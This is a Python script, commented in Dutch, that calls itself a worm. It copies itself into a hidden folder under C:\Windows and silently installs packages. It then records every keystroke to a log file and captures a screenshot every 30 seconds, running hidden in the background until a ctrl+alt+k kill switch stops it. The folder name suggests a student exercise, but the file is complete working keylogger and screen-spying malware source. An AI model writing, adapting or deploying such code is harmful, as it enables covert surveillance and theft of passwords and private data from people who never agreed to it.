# hernoem op het einde van deze worm de extensie naar .pyw ipv .py om het op de achtergrond te laten runnen
import os
import shutil
import threading
import subprocess
import sys
import time
import ctypes
from datetime import datetime

try:
    import keyboard
    import pyscreeze
    import pyautogui
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "keyboard"])
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pillow", "pyscreeze"])
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyautogui"])
    import keyboard
    import pyscreeze
    import pyautogui

# variabelen
exit_event = threading.Event()
now = datetime.now()
date_time = now.strftime("%d/%m/%Y, %H:%M:%S")
date_timeDay = now.strftime("%d-%m-%Y")
hidden_folder_path = os.path.expanduser("C:\\Windows\\s142486_WormFolder")
path = "C:\\Windows\\s142486_WormFolder\\Logs\\keylog.txt"


# maakt de onzichtbare folder in het windows systeem folder om te verstoppen. Hierin wordt ook nog 
if not os.path.exists(hidden_folder_path):
    os.makedirs(hidden_folder_path)
os.system(f'attrib +h "{hidden_folder_path}"')
if not os.path.exists(hidden_folder_path+"\\Logs"):
    os.makedirs(hidden_folder_path+"\\Logs")
if not os.path.exists(hidden_folder_path+f"\\Logs\\ScreenLogs_{date_timeDay}"):
    os.makedirs(hidden_folder_path+f"\\Logs\\ScreenLogs_{date_timeDay}")

# functie dat zichzelf kopieert naar het windows systeem folder
def self_copy(destination_folder):
    if not os.path.exists(destination_folder):
        os.makedirs(destination_folder)
    
    script_path = sys.argv[0]
    destination_path = os.path.join(destination_folder, os.path.basename(script_path))

    shutil.copyfile(script_path, destination_path)

# screenshot function
def take_screenshot():
    timestamp = datetime.now().strftime("%H-%M-%S")
    filename = f"{hidden_folder_path}\\Logs\\ScreenLogs_{date_timeDay}\\Screenlog_{timestamp}.png"
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    
def screenLogger():
    while not exit_event.is_set():
        take_screenshot()
        time.sleep(30)  

def keyLogger():
    with open(path, 'a') as data_file:
        data_file.write(f"\n\n |============================================================================| ")
        data_file.write(f"\n |         V         ! KEYBOARD LOG: {date_time} !         V         | ")
        data_file.write(f"\n |============================================================================| \n\n")
        data_file.write(f"<<{now.strftime("%H:%M")}>> ")
        while not exit_event.is_set():
            try:  
                temp_now = datetime.now() 
                event = keyboard.read_event()
                if event.event_type == keyboard.KEY_DOWN:
                    if event.name == "space":
                        data_file.write(" ")
                    elif event.name == "windows gauche":
                        data_file.write(" WINDOW ")
                    elif event.name == "backspace":
                        data_file.write(" BACKSPACE ")
                    elif event.name == "alt":
                        data_file.write(" ALT ")
                    elif event.name == "alt gr":
                        data_file.write(" ALT_GR ")
                    elif event.name == "ctrl droite":
                        data_file.write(" RIGHT_CTRL ")
                    elif event.name == "ctrl":
                        data_file.write(" CTRL ")
                    elif event.name == "maj":
                        data_file.write(" SHIFT ")
                    elif event.name == "right shift":
                        data_file.write(" RIGHT_SHIFT ")
                    elif event.name == "verr.maj":
                        data_file.write(" SHIFT_LOCK ")
                    elif event.name == "tab":
                        data_file.write(" TAB ")
                    elif event.name == "haut":
                        data_file.write(" ARROW_UP ")
                    elif event.name == "gauche":
                        data_file.write(" ARROW_LEFT ")
                    elif event.name == "bas":
                        data_file.write(" ARROW_DOWN ") 
                    elif event.name == "droite":
                        data_file.write(" ARROW_RIGHT ") 
                    elif event.name == "enter":
                        data_file.write(" ENTER")
                        data_file.write('\n')
                        data_file.write(f"<<{temp_now.strftime("%H:%M")}>> ")
                    else:
                        data_file.write(event.name)
                    data_file.flush()
            except Exception as e:
                data_file.write(f"Error: {e}")
                data_file.flush()
                break      

self_copy(hidden_folder_path) 

def killSwitch():
    keyboard.wait("ctrl+alt+k")
    exit_event.set()

keyLog_thread = threading.Thread(target=keyLogger, name="KeyLogger")
screenLog_thread = threading.Thread(target=screenLogger, name="ScreenLogger")
kill_thread = threading.Thread(target=killSwitch, name="StopKeybindMonitor")

keyLog_thread.start()
screenLog_thread.start()
kill_thread.start()

keyLog_thread.join()
screenLog_thread.join()
kill_thread.join()